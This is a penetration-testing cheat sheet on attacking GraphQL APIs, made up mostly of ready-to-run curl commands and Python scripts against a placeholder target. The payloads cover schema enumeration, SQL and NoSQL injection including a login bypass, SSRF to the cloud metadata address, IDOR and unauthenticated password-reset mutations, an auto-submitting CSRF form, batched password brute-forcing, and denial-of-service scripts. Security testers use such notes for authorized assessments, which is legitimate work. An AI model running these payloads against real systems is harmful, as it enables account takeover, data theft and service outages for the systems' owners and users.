# GraphQL Attacks

#GraphQL #APIAttacks #Injection #WebAppAttacks #Introspection #BOLA #DoS #graphw00f #clairvoyance #graphqlmap #BurpSuite

## What is this?

GraphQL API attack techniques — introspection enumeration, batching abuse, injection via queries/mutations, and auth bypass. Single endpoint makes recon and exploitation differ from REST. Pairs with [[API Attacks]], [[Fuzzing]], [[Web Fuzzing]].

---

## Tools

| Tool | Purpose |
|---|---|
| [[Tools/Web/Burpsuite\|Burp Suite]] | Intercept GraphQL requests, modify queries/mutations, test auth bypass |
| [InQL](https://github.com/doyensec/inql) | Burp extension — introspection, schema visualization, automated query generation (BApp Store) |
| [GraphQL Voyager](https://ivangoncharov.github.io/graphql-voyager/) | Visual schema explorer from introspection JSON |
| [[Tools/Web/graphw00f\|graphw00f]] | GraphQL fingerprinting — identify engine (Apollo, Hasura, etc.) |
| [[Tools/Web/clairvoyance\|clairvoyance]] | Schema inference when introspection is disabled (needs a wordlist) |
| [[Tools/Web/graphqlmap\|graphqlmap]] | Automated GraphQL exploitation — introspection, injection, dumping |
| [[Tools/Web/graphql-cop\|graphql-cop]] | Fast security audit — flags introspection, batching, field suggestions, DoS guards |
| [[Tools/File Transfer/cURL\|curl]] | Manual query/mutation testing |

---

## Identify & Enumerate

```bash
# Common GraphQL endpoints
for path in /graphql /api/graphql /graphql/v1 /v1/graphql /api/v1/graphql /query /api/query /gql /console /graphiql /playground; do
  code=$(curl -so /dev/null -w "%{http_code}" "http://<target>$path")
  echo "$path: $code"
done

# POST probe — minimal query
curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"{ __typename }"}'
# Returns: {"data":{"__typename":"Query"}} → GraphQL confirmed

# GET probe (some endpoints accept GET)
curl -s "http://<target>/graphql?query=%7B__typename%7D"
```

---

## Introspection — Full Schema Dump

```bash
# Full introspection query
curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{
  "query": "{ __schema { queryType { name } mutationType { name } types { kind name fields { name type { name kind ofType { name kind } } args { name type { name kind } } } } } }"
}'

# Cleaner — save full introspection to file
curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"fragment FullType on __Type { kind name fields(includeDeprecated:true) { name args { name type { ...TypeRef } } type { ...TypeRef } } inputFields { name type { ...TypeRef } } interfaces { ...TypeRef } enumValues(includeDeprecated:true) { name } possibleTypes { ...TypeRef } } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } } { __schema { queryType { name } mutationType { name } types { ...FullType } directives { name locations args { name type { ...TypeRef } } } } }"}' | python3 -m json.tool > schema.json

# Parse schema for queries and mutations
python3 << 'EOF'
import json
with open("schema.json") as f:
    schema = json.load(f)

types = schema["data"]["__schema"]["types"]
for t in types:
    if t["kind"] in ["OBJECT"] and not t["name"].startswith("__"):
        if t.get("fields"):
            print(f"\n[{t['name']}]")
            for field in t["fields"]:
                args = ", ".join([a["name"] for a in field.get("args", [])])
                print(f"  {field['name']}({args})")
EOF

# InQL (Burp Extension) — auto-dumps schema, generates queries
# BApp Store → InQL Scanner
```

---

## Query Examples

```bash
# List users (common query name guesses)
curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"{ users { id username email role password } }"}'

curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"{ allUsers { id name email isAdmin } }"}'

# Query with variable
curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"query GetUser($id: ID!) { user(id: $id) { id username email role } }","variables":{"id":"1"}}'

# Mutation — change password
curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"mutation { updatePassword(userId: \"1\", newPassword: \"hacked\") { success } }"}'

# Mutation — create admin user
curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"mutation { createUser(username: \"attacker\", password: \"P@ss!\", role: \"admin\") { id } }"}'
```

---

## Introspection Disabled — Bypass Techniques

When `__schema` is blocked, two approaches remain: `__type` queries (partial introspection) and field suggestion errors.

### `__type` Query (Partial Introspection)

Many servers block `__schema` but forget to block `__type`:

```bash
# Get type definition for a known or guessed type name
curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"{ __type(name: \"Query\") { fields { name description args { name type { name kind } } } } }"}'

# Try common type names
for type in Query Mutation User Admin Product Order; do
  result=$(curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" \
    -d "{\"query\":\"{ __type(name: \\\"$type\\\") { fields { name } } }\"}")
  echo "$type: $(echo $result | python3 -c 'import sys,json; d=json.load(sys.stdin); print(d.get("data",{}).get("__type") or "null")')"
done
```

### Field Suggestion Bypass

```bash
# Trigger suggestion by sending near-miss field name
curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"{ usr { id } }"}'
# Error: "Did you mean user?" → reveals valid field name

# Clairvoyance — brute-force schema via suggestions (needs a wordlist; URL is positional)
pip3 install clairvoyance
clairvoyance -o schema.json -w /usr/share/wordlists/graphql.txt "http://<target>/graphql"

# Manual field guessing
for field in user users admin getUser allUsers listUsers profile me account; do
  result=$(curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d "{\"query\":\"{ $field { id } }\"}")
  echo "$field: $(echo $result | python3 -m json.tool 2>/dev/null | grep -i 'error\|data' | head -1)"
done
```

---

## GraphQL Injection

### SQL Injection via GraphQL Arguments

```bash
# Inject SQLi in query arguments
curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"{ user(id: \"1 OR 1=1-- -\") { id username email } }"}'

# UNION injection
curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"{ user(id: \"1 UNION SELECT 1,username,password,4 FROM users-- -\") { id username email } }"}'

# Time-based blind
curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"{ user(id: \"1; SELECT SLEEP(5)-- -\") { id } }"}'

# Send to sqlmap via Burp request file
# Save the POST request to a file, mark the injection point with * inside the
# JSON body (e.g. "id": "1*"), then let -r read the body — do NOT also pass --data:
sqlmap -r graphql_request.txt --level 5 --risk 3 --batch
```

### NoSQL Injection via GraphQL

> [!warning] You can't inline a Mongo operator object against a `String!` argument — GraphQL type-checks it and `$` isn't a legal name char, so `password: {$gt: ""}` errors at parse time. NoSQLi only lands when the value rides in through a **variable** typed as a custom `JSON`/`Object` scalar (or the resolver forwards raw input to the DB). Pass the operator object as the variable value:

```bash
# Operator injection via a variable typed as a JSON/Object scalar
curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{
  "query": "query($u: JSON!) { user(username: $u) { id username password } }",
  "variables": { "u": { "$regex": ".*" } }
}'

# Auth bypass — always-true operator as the password variable
curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{
  "query": "mutation($p: JSON!) { login(username: \"admin\", password: $p) { token } }",
  "variables": { "p": { "$gt": "" } }
}'
```

### SSRF via GraphQL

```bash
# If there's a URL/import/webhook query
curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"mutation { importData(url: \"http://169.254.169.254/latest/meta-data/\") { result } }"}'

curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"mutation { fetchUrl(url: \"http://127.0.0.1:8080/admin\") { content } }"}'
```

---

## Authorization Bypass

```bash
# IDOR — access other users' data
curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -H "Authorization: Bearer <your-token>" -d '{"query":"{ user(id: \"1\") { id username email secretKey } }"}'  # admin user

# Object-level auth bypass — directly query restricted type
curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -H "Authorization: Bearer <low-priv-token>" -d '{"query":"{ adminPanel { users { id username passwordHash } } }"}'

# Field-level bypass — request sensitive fields not shown in UI
curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -H "Authorization: Bearer <token>" -d '{"query":"{ me { id username email password apiKey creditCard ssn } }"}'

# Unauthenticated mutation
curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"mutation { resetPassword(email: \"admin@target.com\") { success token } }"}'
```

---

## CSRF via GraphQL

If the endpoint accepts requests outside `application/json`, it likely skips the JSON preflight — a cross-site form can then fire a mutation using the victim's cookies.

```bash
# Server accepts form-encoded body → no preflight → CSRF-able
curl -s -X POST "http://<target>/graphql" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data 'query=mutation{updateEmail(email:"attacker@evil.com"){success}}'

# Some servers also accept queries over GET → trivially CSRF-able (and cacheable/loggable)
curl -s "http://<target>/graphql?query=mutation%7BupdateEmail(email%3A%22attacker%40evil.com%22)%7Bsuccess%7D%7D"
```

```html
<!-- Auto-submitting cross-site form (no custom headers = no preflight) -->
<form action="http://<target>/graphql" method="POST">
  <input name="query" value='mutation{updateEmail(email:"attacker@evil.com"){success}}'>
</form>
<script>document.forms[0].submit()</script>
```

> [!note] Mitigation is to reject non-`application/json` content types and disable GET for mutations — so testing which content types the endpoint tolerates is the first CSRF check.

---

## Batching Attacks

GraphQL allows multiple queries in a single request — useful for brute force/rate limit bypass.

```bash
# Batch query (array format) — send 100 login attempts in one request
python3 << 'EOF'
import json, requests

url = "http://<target>/graphql"
passwords = ["password", "123456", "admin", "letmein", "qwerty", "P@ssw0rd"]

batch = []
for i, pwd in enumerate(passwords):
    batch.append({
        "query": f'mutation {{ login(username: "admin", password: "{pwd}") {{ token }} }}',
        "operationName": f"login{i}"
    })

r = requests.post(url, json=batch, headers={"Content-Type": "application/json"})
for i, result in enumerate(r.json()):
    if result.get("data", {}).get("login", {}).get("token"):
        print(f"[+] Valid password: {passwords[i]}")
    else:
        print(f"[-] {passwords[i]}: failed")
EOF

# Alias batching (non-array format — works when array batching disabled)
curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{
  "query": "{ a: login(username:\"admin\",password:\"password\") { token } b: login(username:\"admin\",password:\"123456\") { token } c: login(username:\"admin\",password:\"admin\") { token } }"
}'
```

---

## Directive Abuse

GraphQL's built-in `@include` and `@skip` directives conditionally include fields. This can be abused to access fields that might be filtered or rate-limited when always present.

```bash
# @include — conditionally include a field based on a variable
curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{
  "query": "query GetUser($showSecret: Boolean!) { user(id: 1) { username password @include(if: $showSecret) apiKey @include(if: $showSecret) } }",
  "variables": {"showSecret": true}
}'

# @skip — include field when condition is false
curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{
  "query": "query { user(id: 1) { username password @skip(if: false) } }"
}'

# Inline directive on sensitive mutation — try bypassing server checks that look for specific operation structure
curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{
  "query": "mutation { deleteUser(id: 1) @include(if: true) { success } }"
}'
```

> [!tip] Some server-side auth middleware checks the static operation name/structure but not dynamic directive evaluation — directives can alter what fields resolve at runtime, potentially bypassing static analysis.

---

## Denial of Service

```bash
# Deep nesting attack (if no depth limit)
curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"{ user { friends { friends { friends { friends { friends { id } } } } } } }"}'

# Field duplication (if no complexity limit)
curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"{ user { id id id id id id id id id id id id id id id id id id id id } }"}'

# Directive overload (CVE-2024-47614) — undefined directives still get parsed and
# error-handled, so response size and processing time climb with each one
python3 -c "print('{\"query\":\"{ __typename ' + '@a @b @c @d @e @r @s @a @f @d '*100 + '}\"}')" > dirbomb.json
curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d @dirbomb.json -o /dev/null -w "time=%{time_total}s size=%{size_download}\n"
# Compare against a baseline query — a large jump means limit_directives isn't set

# Recursive / circular fragments — expand during query planning
# (Apollo Router CVE-2025-32032; Hot Chocolate CVE-2026-40324 hit a stack overflow at ~40 KB)
curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{
  "query": "fragment A on User { ...B } fragment B on User { ...A } { user { ...A } }"
}'
# A spec-compliant server rejects this at validation ("Cannot spread fragment A within itself").
# A hang, 500, or stack-trace instead means the cycle check is missing → DoS primitive.

# Introspection DoS — if server doesn't cache schema resolution
curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"{ __schema { types { fields { type { fields { type { fields { name } } } } } } } }"}'

# Subscription exhaustion (WebSocket-based)
# Open many long-lived subscription connections to exhaust server threads/connections
# NOTE: legacy servers use the graphql-ws subprotocol (connection_init/start, below);
#       newer ones use graphql-transport-ws (connection_init/subscribe) — adjust accordingly
python3 << 'EOF'
import websocket, threading, time

TARGET_WS = "ws://<target>/graphql"
SUBSCRIPTION = '{"type":"start","id":"1","payload":{"query":"subscription { onNewMessage { id content } }"}}'

def open_sub(i):
    ws = websocket.WebSocket()
    ws.connect(TARGET_WS, subprotocols=["graphql-ws"])
    ws.send('{"type":"connection_init"}')
    ws.send(SUBSCRIPTION.replace('"1"', f'"{i}"'))
    time.sleep(60)  # hold connection open

threads = [threading.Thread(target=open_sub, args=(i,)) for i in range(200)]
for t in threads: t.start()
for t in threads: t.join()
EOF
```

> [!warning] Every technique in this section degrades or drops the service. None of them belong in an engagement without explicit written authorization for DoS testing — which most scopes exclude. The safe version is to **confirm the guard is missing** (one directive-overload request, timed against a baseline; one circular fragment checked for a validation error) and report the absent limit, rather than actually exhausting the target.

> [!note] **Reverse direction — CVE-2025-27407.** The Ruby `graphql` gem is vulnerable to RCE when *loading* an attacker-controlled schema via `GraphQL::Schema.from_introspection` or `Schema::Loader.load`. Worth remembering when the target is a client, gateway, or dev tool that ingests introspection JSON you can supply — the usual attacker/victim roles flip.

---

## Tooling & Recon Commands

```bash
# GraphQL Voyager — visualize schema (paste introspection JSON)
# https://ivangoncharov.github.io/graphql-voyager/

# InQL (Burp Suite extension)
# Auto-discovers schema, generates queries, scans for vulns

# Altair / GraphiQL — interactive query UI (if exposed)
# Check: /graphiql  /playground  /altair  /api/explorer

# graphw00f — fingerprint GraphQL engine (run from the cloned repo)
git clone https://github.com/dolevf/graphw00f && cd graphw00f
python3 main.py -f -t http://<target>/graphql
# Identifies: Apollo, Hasura, GraphQL-Java, Ariadne, Strawberry, etc.

# Clairvoyance — schema recovery without introspection (URL positional, wordlist required)
pip3 install clairvoyance
clairvoyance -o schema.json -w /usr/share/wordlists/graphql.txt http://<target>/graphql

# graphql-cop — security audit tool
pip3 install graphql-cop
graphql-cop -t http://<target>/graphql

# graphqlmap — automated exploitation (introspection, injection, dump)
git clone https://github.com/swisskyrepo/GraphQLmap && cd GraphQLmap
python3 graphqlmap.py -u http://<target>/graphql --method POST
# Interactive shell: type 'help' for commands
# dump_via_introspection — get full schema
# dump_via_introspection | jq — pipe to jq for parsing
```

---

## Quick Reference

```bash
# Confirm GraphQL
curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"{ __typename }"}'

# Dump schema
curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"{ __schema { types { name kind fields { name } } } }"}' | python3 -m json.tool

# List all queries
curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"{ __schema { queryType { fields { name description } } } }"}'

# List all mutations
curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"{ __schema { mutationType { fields { name description args { name } } } } }"}'

# SQLi test
curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"{ user(id: \"1 OR 1=1-- -\") { id username } }"}'

# Fingerprint the engine (determines which bypasses are worth trying)
python3 main.py -f -t http://<target>/graphql          # graphw00f

# One-shot security audit — introspection, batching, suggestions, missing DoS guards
graphql-cop -t http://<target>/graphql

# Introspection disabled? recover the schema from field suggestions
clairvoyance -o schema.json -w /usr/share/wordlists/graphql.txt "http://<target>/graphql"

# Circular-fragment guard check (expect a validation error, not a hang)
curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" \
  -d '{"query":"fragment A on User { ...B } fragment B on User { ...A } { user { ...A } }"}'
```

---

*Created: 2026-03-04*
*Updated: 2026-07-30*
*Model: claude-opus-5*